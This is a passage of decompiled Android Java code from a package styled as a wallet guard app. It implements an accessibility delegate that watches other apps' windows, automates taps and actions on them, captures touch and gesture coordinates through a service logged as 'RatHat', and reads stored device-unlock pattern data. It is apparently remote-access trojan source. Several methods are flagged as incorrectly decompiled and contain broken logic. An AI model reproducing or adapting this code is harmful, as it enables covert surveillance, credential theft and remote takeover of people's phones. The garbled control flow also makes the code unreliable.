package p012o;

import a1.AbstractC0026q;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.GlobalActionCondition;
import com.guard.wallet.condition.TargetActionCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFilterWithChild;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.helper.AbstractC0192o;
import com.guard.wallet.helper.AbstractC0195r;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.plug.C0224c;
import com.guard.wallet.req.EventSubscribe;
import com.guard.wallet.req.ListenPropResponse;
import com.guard.wallet.req.ListenResponseVO;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.SearchNodeListResultVO;
import com.guard.wallet.resp.SearchNodeResultVO;
import com.guard.wallet.resp.UiObjectVO;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import com.guard.wallet.utils.C0253i;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import org.bouncycastle.i18n.TextBundle;
import p002e.RunnableC0261a;
import p005h.C0318e;
import p008k.C0356a;

/* renamed from: o.e */
/* loaded from: classes.dex */
public class C0416e {

    /* renamed from: a */
    public String f862a;

    /* renamed from: b */
    public final C0253i f863b;

    /* renamed from: c */
    public final String f864c;

    /* renamed from: d */
    public final ConcurrentLinkedQueue f865d;

    /* renamed from: e */
    public final ConcurrentHashMap f866e;

    /* renamed from: f */
    public final ConcurrentHashMap f867f;

    /* renamed from: g */
    public final AtomicInteger f868g;

    /* renamed from: h */
    public final AtomicReference f869h;

    /* renamed from: i */
    public final AtomicBoolean f870i;

    /* renamed from: j */
    public final AtomicReference f871j;

    /* renamed from: k */
    public final AtomicReference f872k;

    /* renamed from: l */
    public final AtomicReference f873l;

    /* renamed from: m */
    public final ConcurrentHashMap f874m;

    public C0416e(Collection collection, String str) {
        ConcurrentLinkedQueue concurrentLinkedQueue = new ConcurrentLinkedQueue();
        this.f865d = concurrentLinkedQueue;
        this.f866e = new ConcurrentHashMap();
        this.f867f = new ConcurrentHashMap();
        this.f868g = new AtomicInteger(-1);
        this.f869h = new AtomicReference(null);
        this.f870i = new AtomicBoolean(false);
        this.f871j = new AtomicReference(null);
        this.f872k = new AtomicReference(null);
        this.f873l = new AtomicReference(null);
        this.f874m = new ConcurrentHashMap();
        C0253i c0253i = new C0253i(10L);
        this.f863b = c0253i;
        this.f864c = String.valueOf(c0253i.m723a());
        try {
            this.f862a = str;
            if (collection != null && !collection.isEmpty()) {
                concurrentLinkedQueue.addAll(collection);
            }
            if (AbstractC0026q.m151B(this.f862a) || !concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.add(new ListenWindow(String.valueOf(c0253i.m723a()), this.f862a, null));
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
        }
    }

    /* renamed from: A */
    public static void m1055A(EventSubscribe eventSubscribe, ArrayList arrayList) {
        boolean actionByName;
        StringBuilder sb;
        try {
            if (arrayList.isEmpty() || eventSubscribe.getReplyActions() == null || eventSubscribe.getReplyActions().isEmpty()) {
                return;
            }
            Iterator it = arrayList.iterator();
            while (it.hasNext()) {
                UiObject uiObject = (UiObject) it.next();
                if (uiObject != null) {
                    int i2 = 0;
                    for (TargetActionCondition targetActionCondition : eventSubscribe.getReplyActions()) {
                        i2++;
                        if (Objects.equals(targetActionCondition.getActionType(), 0)) {
                            GlobalActionCondition globalActionCondition = targetActionCondition.toGlobalActionCondition();
                            if (globalActionCondition != null) {
                                actionByName = AbstractC0251g.m654a(globalActionCondition);
                                sb = new StringBuilder();
                                sb.append("Delegate GlobalActionAutomator actionByName:");
                                sb.append(targetActionCondition.toString());
                            } else {
                                actionByName = false;
                                if (actionByName && i2 < eventSubscribe.getReplyActions().size()) {
                                    Thread.sleep((eventSubscribe.getEventGap() != null || eventSubscribe.getEventGap().intValue() <= 0) ? 300L : eventSubscribe.getEventGap().intValue() * 1000);
                                }
                            }
                        } else {
                            uiObject.refresh();
                            actionByName = uiObject.actionByName(targetActionCondition);
                            sb = new StringBuilder();
                            sb.append("Delegate source actionByName:");
                            sb.append(targetActionCondition.toString());
                        }
                        Log.d("AccessibilityDelegate", sb.toString());
                        if (actionByName) {
                            Thread.sleep((eventSubscribe.getEventGap() != null || eventSubscribe.getEventGap().intValue() <= 0) ? 300L : eventSubscribe.getEventGap().intValue() * 1000);
                        }
                    }
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate:replyActions", e2);
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:28:0x006d, code lost:
    
        if (r4 != null) goto L26;
     */
    /* renamed from: s */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static LinkedList m1056s(EventSubscribe eventSubscribe, UiObject uiObject) {
        UiObject m930t;
        if (uiObject == null) {
            return null;
        }
        try {
            if (eventSubscribe.getSelector() == null) {
                return null;
            }
            LinkedList linkedList = new LinkedList();
            if (eventSubscribe.getSourceRule().intValue() != 0 && eventSubscribe.getSourceRule().intValue() != 10) {
                if (eventSubscribe.getSourceRule().intValue() == 1) {
                    m930t = eventSubscribe.getSelector().m927q(uiObject);
                    if (m930t != null) {
                        linkedList.add(m930t);
                    }
                } else if (eventSubscribe.getSourceRule().intValue() == 2) {
                    UiObjectCollection m928r = eventSubscribe.getSelector().m928r(uiObject);
                    if (m928r != null && m928r.size() > 0) {
                        linkedList.addAll(m928r.getNodes());
                    }
                } else {
                    Log.d("AccessibilityDelegate", "无效节点检索规则");
                }
                return linkedList;
            }
            m930t = eventSubscribe.getSelector().m930t(uiObject);
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
            return null;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:22:0x005e A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:30:0x003e A[SYNTHETIC] */
    /* renamed from: B */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m1057B(EventSubscribe eventSubscribe) {
        boolean z2;
        try {
            if ((!Objects.equals(eventSubscribe.getListenType(), 8) && !Objects.equals(eventSubscribe.getListenType(), 9)) || eventSubscribe.getReplySubscribes() == null || eventSubscribe.getReplySubscribes().isEmpty()) {
                return;
            }
            eventSubscribe.setNeedReply(false);
            for (String str : eventSubscribe.getReplySubscribes()) {
                try {
                } catch (Exception e2) {
                    AbstractC0026q.m186s("AccessibilityDelegate", e2);
                }
                if (!AbstractC0026q.m151B(str)) {
                    z2 = this.f867f.containsKey(str);
                    if (z2) {
                        if (Objects.equals(eventSubscribe.getListenType(), 8)) {
                            m1071j(str);
                        } else {
                            m1063a(str);
                        }
                        eventSubscribe.setNeedReply(true);
                    }
                }
                z2 = false;
                if (z2) {
                }
            }
            if (eventSubscribe.isNeedReply()) {
                if (eventSubscribe.getListenProps() == null || eventSubscribe.getListenProps().isEmpty()) {
                    m1085z(eventSubscribe);
                    ListenResponseVO listenResponseVO = new ListenResponseVO();
                    listenResponseVO.setSubscribeId(eventSubscribe.getId());
                    listenResponseVO.setListenId(eventSubscribe.getListenId());
                    listenResponseVO.setDelegateId(this.f864c);
                    MessageRecordVO messageRecordVO = new MessageRecordVO();
                    messageRecordVO.setExtraBody(listenResponseVO);
                    messageRecordVO.setIntentCode("android.accessibility.delegate.LISTEN_WINDOW_EVENT");
                    if (MainApplication.getInstance() == null || MainApplication.getInstance().getHandlerMsgAndTimer() == null) {
                        return;
                    }
                    MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
                }
            }
        } catch (Exception e3) {
            AbstractC0026q.m186s("AccessibilityDelegate", e3);
        }
    }

    /* renamed from: C */
    public final SearchNodeListResultVO m1058C(UiObjectCollection uiObjectCollection) {
        if (uiObjectCollection == null) {
            return null;
        }
        try {
            String valueOf = String.valueOf(this.f863b.m723a());
            this.f874m.put(valueOf, uiObjectCollection);
            return new SearchNodeListResultVO(valueOf, uiObjectCollection.toListVO());
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
            return null;
        }
    }

    /* renamed from: D */
    public final SearchNodeResultVO m1059D(UiObject uiObject) {
        if (uiObject == null) {
            return null;
        }
        try {
            String valueOf = String.valueOf(this.f863b.m723a());
            this.f874m.put(valueOf, uiObject);
            return new SearchNodeResultVO(valueOf, new UiObjectVO(uiObject));
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
            return null;
        }
    }

    /* renamed from: E */
    public final void m1060E(EventSubscribe eventSubscribe, Long l2) {
        try {
            boolean z2 = false;
            boolean z3 = true;
            ReqListenHelper reqListenHelper = new ReqListenHelper(eventSubscribe.getListenType(), eventSubscribe.getId(), Integer.valueOf(AbstractC0249e.m621j() ? 1 : 0));
            reqListenHelper.setListenId(eventSubscribe.getListenId());
            if (!AbstractC0026q.m151B(eventSubscribe.getHelperProp())) {
                reqListenHelper.setProp(eventSubscribe.getHelperProp());
            }
            if (l2 != null && l2.longValue() > 0) {
                reqListenHelper.setBatchId(String.valueOf(l2));
            }
            reqListenHelper.setDelegateId(this.f864c);
            if (!AbstractC0207l.m426i(reqListenHelper) && (C0318e.m844S() == null || !C0318e.m844S().mo302D())) {
                if (Objects.equals(eventSubscribe.getHelperProp(), "TOUCH_POINT")) {
                    if (!Objects.equals(reqListenHelper.getListenType(), 1)) {
                        AbstractC0195r.m376e(this, eventSubscribe.getCombineFilter(), reqListenHelper);
                    }
                    if (Objects.equals(reqListenHelper.getListenType(), 1)) {
                        AbstractC0195r.m376e(this, null, reqListenHelper);
                    }
                }
                if (Objects.equals(eventSubscribe.getHelperProp(), "GESTURE_POINTS")) {
                    if (!Objects.equals(reqListenHelper.getListenType(), 1)) {
                        AbstractC0192o.m363d(this, eventSubscribe.getCombineFilter(), reqListenHelper);
                    }
                    if (Objects.equals(reqListenHelper.getListenType(), 1)) {
                        ReqUnlockDeviceVO m702f = AbstractC0252h.m702f();
                        if (m702f == null || !Objects.equals(m702f.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN") || m702f.getPatternCipher() == null || m702f.getPatternCipher().isEmpty()) {
                            ReqUnlockDeviceVO m703g = AbstractC0252h.m703g();
                            if (m703g != null && Objects.equals(m703g.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN") && m703g.getPatternCipher() != null && !m703g.getPatternCipher().isEmpty()) {
                                z2 = true;
                            }
                            z3 = z2;
                        }
                        if (!z3) {
                            AbstractC0192o.m363d(this, eventSubscribe.getCombineFilter(), reqListenHelper);
                        }
                    }
                }
            }
            AbstractC0252h.m683D(eventSubscribe.getId(), AbstractC0251g.p0() ? "lockSubscribeId" : "helpSubscribeId");
            Log.d("AccessibilityDelegate", "已经发送辅助监听");
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
        }
    }

    /* renamed from: F */
    public final void m1061F(UiObject uiObject) {
        this.f869h.set(uiObject);
    }

    /* renamed from: G */
    public final void m1062G() {
        AtomicInteger atomicInteger = new AtomicInteger(15);
        while (!this.f870i.get() && atomicInteger.decrementAndGet() > 0) {
            AbstractC0251g.T0(1);
        }
    }

    /* renamed from: a */
    public final void m1063a(String str) {
        try {
            String m708l = AbstractC0252h.m708l("helpSubscribeId");
            if (AbstractC0026q.m151B(m708l) || !Objects.equals(m708l, str)) {
                return;
            }
            if (AbstractC0195r.m382k()) {
                AbstractC0195r.m378g(false);
            }
            if (AbstractC0192o.m368i() || AbstractC0192o.m367h()) {
                AbstractC0192o.m365f(null, false);
            }
            ReqListenHelper reqListenHelper = new ReqListenHelper(str, 0);
            reqListenHelper.setDelegateId(this.f864c);
            AbstractC0207l.m425h(reqListenHelper);
            AbstractC0252h.m719w("helpSubscribeId");
            Log.d("AccessibilityDelegate", "已经发送 取消辅助监听");
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
        }
    }

    /* renamed from: b */
    public final boolean m1064b(EventSubscribe eventSubscribe) {
        boolean z2 = true;
        if (eventSubscribe != null) {
            try {
                if (!AbstractC0026q.m151B(eventSubscribe.getId()) && eventSubscribe.getEventGap() != null && eventSubscribe.getEventGap().intValue() > 0) {
                    Long valueOf = Long.valueOf(System.currentTimeMillis());
                    ConcurrentHashMap concurrentHashMap = this.f866e;
                    Long l2 = (Long) concurrentHashMap.get(eventSubscribe.getId());
                    if (l2 != null && l2.longValue() > 0 && valueOf.longValue() - l2.longValue() < eventSubscribe.getEventGap().intValue() * 1000) {
                        z2 = false;
                    }
                    concurrentHashMap.put(eventSubscribe.getId(), valueOf);
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
        }
        return z2;
    }

    /* renamed from: c */
    public final boolean m1065c(String str, String str2) {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f865d;
        try {
            return !concurrentLinkedQueue.isEmpty() ? concurrentLinkedQueue.contains(new ListenWindow(str, str2)) : Objects.equals(this.f862a, str);
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
            return false;
        }
    }

    /* renamed from: d */
    public void mo1001d() {
        try {
            AbstractC0243l.m591a(this.f864c);
            AtomicReference atomicReference = this.f869h;
            if (atomicReference.get() != null) {
                ((UiObject) atomicReference.get()).recycle();
            }
            atomicReference.set(null);
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f865d;
            if (!concurrentLinkedQueue.isEmpty()) {
                Iterator it = concurrentLinkedQueue.iterator();
                while (it.hasNext()) {
                    ((ListenWindow) it.next()).destroy();
                }
            }
            concurrentLinkedQueue.clear();
            this.f874m.clear();
            this.f866e.clear();
            this.f867f.clear();
            this.f868g.set(-1);
            this.f871j.set(null);
            this.f872k.set(null);
            this.f862a = null;
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:36:0x00b7 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:76:0x0047 A[SYNTHETIC] */
    /* renamed from: e */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m1066e(ListenWindow listenWindow, j0 j0Var) {
        boolean z2;
        try {
            if (listenWindow.getEventSubscribes() == null || listenWindow.getEventSubscribes().isEmpty()) {
                return;
            }
            Long valueOf = listenWindow.getListenType().intValue() == 1 ? Long.valueOf(AbstractC0252h.m706j("lockBatchId")) : 0L;
            if (valueOf.longValue() <= 0) {
                valueOf = Long.valueOf(this.f863b.m723a());
            }
            for (EventSubscribe eventSubscribe : listenWindow.getEventSubscribes()) {
                if (m1064b(eventSubscribe)) {
                    eventSubscribe.setEventTimestamp(Long.valueOf(j0Var.f921g));
                    if (AbstractC0026q.m151B(eventSubscribe.getListenId())) {
                        eventSubscribe.setListenId(listenWindow.getId());
                    }
                    if (AbstractC0026q.m151B(eventSubscribe.getId()) && !AbstractC0026q.m151B(eventSubscribe.getListenId())) {
                        eventSubscribe.setId(eventSubscribe.getListenId());
                    }
                    int i2 = j0Var.f916b;
                    try {
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("AccessibilityDelegate", e2);
                        z2 = false;
                    }
                    if (eventSubscribe.getEventTypes() != null && !eventSubscribe.getEventTypes().isEmpty()) {
                        z2 = eventSubscribe.getEventTypes().contains(Integer.valueOf(i2));
                        if (z2) {
                            if (eventSubscribe.getReplySubscribes() != null && !eventSubscribe.getReplySubscribes().isEmpty()) {
                                m1057B(eventSubscribe);
                            }
                            if (eventSubscribe.getListenHelper() && !AbstractC0026q.m151B(eventSubscribe.getHelperProp())) {
                                Log.d("AccessibilityDelegate", "向本地7912RatHat请求监听滑动坐标、触摸坐标:" + eventSubscribe.getHelperProp());
                                m1060E(eventSubscribe, valueOf);
                            }
                            if ((eventSubscribe.getListenProps() != null && !eventSubscribe.getListenProps().isEmpty()) || (eventSubscribe.getReplyActions() != null && !eventSubscribe.getReplyActions().isEmpty())) {
                                ArrayList m1079r = m1079r(eventSubscribe, j0Var.f915a);
                                if (eventSubscribe.getListenProps() != null && !eventSubscribe.getListenProps().isEmpty()) {
                                    m1083x(eventSubscribe, m1079r, j0Var.f919e, j0Var.f920f, valueOf);
                                }
                                if (eventSubscribe.getReplyActions() != null && !eventSubscribe.getReplyActions().isEmpty()) {
                                    m1055A(eventSubscribe, m1079r);
                                }
                            }
                        }
                    }
                    z2 = true;
                    if (z2) {
                    }
                }
            }
        } catch (Exception e3) {
            AbstractC0026q.m186s("AccessibilityDelegate:everyEventSubscribe", e3);
        }
    }

    public boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (obj == null || getClass() != obj.getClass()) {
            return false;
        }
        C0416e c0416e = (C0416e) obj;
        return Objects.equals(this.f862a, c0416e.f862a) && Objects.equals(this.f864c, c0416e.f864c);
    }

    /* renamed from: f */
    public final SearchNodeListResultVO m1067f(CombineFilterWithChild combineFilterWithChild) {
        UiObject m1075n;
        if (combineFilterWithChild == null) {
            return null;
        }
        try {
            if (combineFilterWithChild.getParentFilter() == null || (m1075n = m1075n(combineFilterWithChild.getParentFilter())) == null) {
                return null;
            }
            LinkedList linkedList = new LinkedList();
            UiObjectCollection findByCombine = m1075n.findByCombine(combineFilterWithChild.getParentFilter());
            if (findByCombine != null && !findByCombine.empty().booleanValue()) {
                for (int i2 = 0; i2 < findByCombine.size(); i2++) {
                    UiObject uiObject = findByCombine.get(i2);
                    if (uiObject.findOneByCombine(combineFilterWithChild.getChildFilter()) != null) {
                        linkedList.add(uiObject);
                    }
                }
            }
            return m1058C(UiObjectCollection.of(linkedList));
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
            return null;
        }
    }

    /* renamed from: g */
    public final SearchNodeListResultVO m1068g(CombineFilterWithChild combineFilterWithChild) {
        UiObject m1075n;
        if (combineFilterWithChild == null) {
            return null;
        }
        try {
            if (combineFilterWithChild.getParentFilter() == null || (m1075n = m1075n(combineFilterWithChild.getParentFilter())) == null) {
                return null;
            }
            LinkedList linkedList = new LinkedList();
            UiObjectCollection findByCombine = m1075n.findByCombine(combineFilterWithChild.getParentFilter());
            if (findByCombine != null && !findByCombine.empty().booleanValue()) {
                for (int i2 = 0; i2 < findByCombine.size(); i2++) {
                    UiObject uiObject = findByCombine.get(i2);
                    if (uiObject.findOneByCombine(combineFilterWithChild.getChildFilter()) == null) {
                        linkedList.add(uiObject);
                    }
                }
            }
            return m1058C(UiObjectCollection.of(linkedList));
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
            return null;
        }
    }

    /* renamed from: h */
    public final SearchNodeListResultVO m1069h(CombineFiltersWithOr combineFiltersWithOr) {
        UiObjectCollection findByCombine;
        if (combineFiltersWithOr != null) {
            try {
                if (combineFiltersWithOr.getFilters() != null && !combineFiltersWithOr.getFilters().isEmpty()) {
                    UiObjectCollection of = UiObjectCollection.of(null);
                    for (CombineFilter combineFilter : combineFiltersWithOr.getFilters()) {
                        if (combineFilter != null) {
                            combineFilter.setTarget(combineFiltersWithOr.getTarget());
                            combineFilter.setResUnique(combineFiltersWithOr.getResUnique());
                            UiObject m1075n = m1075n(combineFilter);
                            if (m1075n != null && (findByCombine = m1075n.findByCombine(combineFilter)) != null && findByCombine.size() > 0) {
                                of.getNodes().addAll(findByCombine.getNodes());
                            }
                        }
                    }
                    return m1058C(of);
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
        }
        return null;
    }

    public int hashCode() {
        return Objects.hash(this.f862a, this.f864c);
    }

    /* renamed from: i */
    public final SearchNodeResultVO m1070i(CombineFiltersWithOr combineFiltersWithOr) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1075n;
        if (combineFiltersWithOr != null) {
            try {
                if (combineFiltersWithOr.getFilters() != null && !combineFiltersWithOr.getFilters().isEmpty()) {
                    for (CombineFilter combineFilter : combineFiltersWithOr.getFilters()) {
                        if (combineFilter != null) {
                            combineFilter.setTarget(combineFiltersWithOr.getTarget());
                            combineFilter.setResUnique(combineFiltersWithOr.getResUnique());
                            try {
                                m1075n = m1075n(combineFilter);
                            } catch (Exception e2) {
                                AbstractC0026q.m186s("AccessibilityDelegate", e2);
                            }
                            if (m1075n != null) {
                                searchNodeResultVO = m1059D(m1075n.findOneByCombine(combineFilter));
                                if (searchNodeResultVO != null && searchNodeResultVO.getNode() != null) {
                                    return searchNodeResultVO;
                                }
                            }
                            searchNodeResultVO = null;
                            if (searchNodeResultVO != null) {
                                return searchNodeResultVO;
                            }
                            continue;
                        }
                    }
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("AccessibilityDelegate", e3);
            }
        }
        return null;
    }

    /* renamed from: j */
    public final void m1071j(String str) {
        try {
            String m708l = AbstractC0252h.m708l("helpSubscribeId");
            if (AbstractC0026q.m151B(m708l) || !Objects.equals(m708l, str)) {
                return;
            }
            if (AbstractC0195r.m382k()) {
                AbstractC0195r.m378g(true);
            }
            if (AbstractC0192o.m368i() || AbstractC0192o.m367h()) {
                AbstractC0192o.m365f(null, true);
            }
            ReqListenHelper reqListenHelper = new ReqListenHelper(str, 4);
            reqListenHelper.setDelegateId(this.f864c);
            AbstractC0207l.m425h(reqListenHelper);
            AbstractC0252h.m719w("helpSubscribeId");
            Log.d("AccessibilityDelegate", "已经发送 完成辅助监听");
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
        }
    }

    /* renamed from: k */
    public final UiObject m1072k() {
        return (UiObject) this.f869h.get();
    }

    /* renamed from: l */
    public final LinkedHashSet m1073l() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f865d;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return null;
            }
            LinkedHashSet linkedHashSet = new LinkedHashSet();
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                ListenWindow listenWindow = (ListenWindow) it.next();
                if (listenWindow != null && listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty()) {
                    linkedHashSet.addAll(listenWindow.getEventTypes());
                }
            }
            return linkedHashSet;
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate:getEventTypes", e2);
            return null;
        }
    }

    /* renamed from: m */
    public final UiObject m1074m(int i2, String str) {
        if (i2 < 0) {
            i2 = 0;
        }
        try {
            if (AbstractC0026q.m151B(str)) {
                return (UiObject) this.f869h.get();
            }
            Object obj = this.f874m.get(str);
            UiObject uiObject = obj instanceof UiObjectCollection ? ((UiObjectCollection) obj).get(i2) : null;
            return ((obj instanceof UiObject) && i2 == 0) ? (UiObject) obj : uiObject;
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
            return null;
        }
    }

    /* renamed from: n */
    public final UiObject m1075n(CombineFilter combineFilter) {
        return m1074m(combineFilter.getTarget(), combineFilter.getResUnique());
    }

    /* renamed from: o */
    public final boolean m1076o() {
        AtomicInteger atomicInteger = this.f868g;
        return atomicInteger.get() >= 0 && atomicInteger.get() <= 10;
    }

    /* renamed from: p */
    public final boolean m1077p(ListenWindow listenWindow, UiObject uiObject) {
        try {
            List<CombineFilter> matchs = listenWindow.getMatchs();
            AtomicReference atomicReference = this.f869h;
            if (matchs != null && !listenWindow.getMatchs().isEmpty()) {
                for (CombineFilter combineFilter : listenWindow.getMatchs()) {
                    if (!m1080t(combineFilter, uiObject) && !m1080t(combineFilter, (UiObject) atomicReference.get())) {
                        return false;
                    }
                }
            }
            if (listenWindow.getDismiss() == null || listenWindow.getDismiss().isEmpty()) {
                return true;
            }
            for (CombineFilter combineFilter2 : listenWindow.getDismiss()) {
                if (m1080t(combineFilter2, uiObject) || m1080t(combineFilter2, (UiObject) atomicReference.get())) {
                    return false;
                }
            }
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("matchListenWindow 2:", e2);
            return true;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:41:0x00ac A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:43:? A[LOOP:0: B:13:0x001e->B:43:?, LOOP_END, SYNTHETIC] */
    /* renamed from: q */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m1078q(List list) {
        boolean z2;
        if (list != null) {
            try {
                if (!list.isEmpty()) {
                    AtomicReference atomicReference = this.f869h;
                    if (atomicReference.get() != null) {
                        ((UiObject) atomicReference.get()).refresh();
                    }
                    Iterator it = list.iterator();
                    while (it.hasNext()) {
                        ListenWindow listenWindow = (ListenWindow) it.next();
                        if (listenWindow.equals(new ListenWindow((String) this.f871j.get(), (String) this.f872k.get()))) {
                            if (listenWindow.getMatchs() != null && !listenWindow.getMatchs().isEmpty()) {
                                Iterator<CombineFilter> it2 = listenWindow.getMatchs().iterator();
                                while (it2.hasNext()) {
                                    if (!m1080t(it2.next(), (UiObject) atomicReference.get())) {
                                        z2 = false;
                                        break;
                                    }
                                }
                            }
                            z2 = true;
                            if (listenWindow.getDismiss() != null && !listenWindow.getDismiss().isEmpty()) {
                                Iterator<CombineFilter> it3 = listenWindow.getDismiss().iterator();
                                while (it3.hasNext()) {
                                    if (m1080t(it3.next(), (UiObject) atomicReference.get())) {
                                    }
                                }
                            }
                            if (!z2) {
                                return true;
                            }
                        }
                        z2 = false;
                        if (!z2) {
                        }
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("matchListenWindow 1:", e2);
            }
        }
        return false;
    }

    /* renamed from: r */
    public final ArrayList m1079r(EventSubscribe eventSubscribe, UiObject uiObject) {
        LinkedList m1056s;
        LinkedList m1056s2;
        LinkedList m1056s3;
        ArrayList arrayList = new ArrayList();
        try {
            if (eventSubscribe.getSelector() != null) {
                if (uiObject != null && (m1056s3 = m1056s(eventSubscribe, uiObject)) != null && !m1056s3.isEmpty()) {
                    arrayList.addAll(m1056s3);
                }
                AtomicReference atomicReference = this.f869h;
                if (atomicReference.get() != null) {
                    if (arrayList.isEmpty() && ((Objects.equals(eventSubscribe.getSourceRule(), 0) || Objects.equals(eventSubscribe.getSourceRule(), 1)) && (m1056s2 = m1056s(eventSubscribe, (UiObject) atomicReference.get())) != null && !m1056s2.isEmpty())) {
                        arrayList.addAll(m1056s2);
                    }
                    if (Objects.equals(eventSubscribe.getSourceRule(), 2) && (m1056s = m1056s(eventSubscribe, (UiObject) atomicReference.get())) != null && !m1056s.isEmpty()) {
                        arrayList.addAll(m1056s);
                    }
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
        }
        return arrayList;
    }

    /* renamed from: t */
    public final boolean m1080t(CombineFilter combineFilter, UiObject uiObject) {
        if (uiObject != null && combineFilter != null) {
            try {
                C0356a globalSelector = combineFilter.toGlobalSelector((String) this.f873l.get());
                int i2 = 0;
                while (globalSelector != null) {
                    if (i2 > combineFilter.getRepeatCount().intValue()) {
                        break;
                    }
                    if (globalSelector.m930t(uiObject) != null) {
                        return true;
                    }
                    if (i2 >= combineFilter.getRepeatCount().intValue()) {
                        return false;
                    }
                    AbstractC0251g.T0(2);
                    i2++;
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate:matchWindowFromParent", e2);
            }
        }
        return false;
    }

    /* renamed from: u */
    public void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        if (accessibilityEvent != null) {
            try {
                if (m1076o()) {
                    UiObject createRoot = UiObject.createRoot(accessibilityEvent.getSource(), true);
                    String str3 = this.f864c;
                    if (createRoot != null) {
                        createRoot.setUniqueId(str3);
                    }
                    AbstractC0243l.m593c(new RunnableC0415d(this, new j0(createRoot, accessibilityEvent.getEventType(), str, str2, (accessibilityEvent.getEventType() != 16 || accessibilityEvent.getBeforeText() == null) ? null : accessibilityEvent.getBeforeText().toString()), 0), str3);
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate:onAccessibilityEvent", e2);
            }
        }
    }

    /* renamed from: v */
    public final void m1081v(UiObject uiObject, boolean z2, String str, String str2, String str3) {
        AtomicReference atomicReference = this.f869h;
        try {
            if (!Objects.equals(uiObject, atomicReference.get())) {
                if (atomicReference.get() != null) {
                    Log.d("AccessibilityDelegate", "delegate activeRoot recycle");
                    ((UiObject) atomicReference.get()).recycle();
                }
                this.f874m.clear();
                Log.d("AccessibilityDelegate", "delegate activeRoot 已更改");
            }
            String str4 = this.f864c;
            if (uiObject != null) {
                uiObject.setUniqueId(str4);
            }
            atomicReference.set(uiObject);
            AtomicBoolean atomicBoolean = this.f870i;
            atomicBoolean.set(z2);
            this.f871j.set(str);
            this.f872k.set(str2);
            this.f873l.set(str3);
            if (atomicBoolean.get()) {
                return;
            }
            AbstractC0243l.m593c(new RunnableC0261a(this, 1), str4);
        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
        }
    }

    /* renamed from: w */
    public final void m1082w(boolean z2) {
        AtomicInteger atomicInteger = this.f868g;
        try {
            if (z2) {
                atomicInteger.set(0);
            } else {
                this.f869h.get();
                atomicInteger.set(atomicInteger.get() + 1);
            }
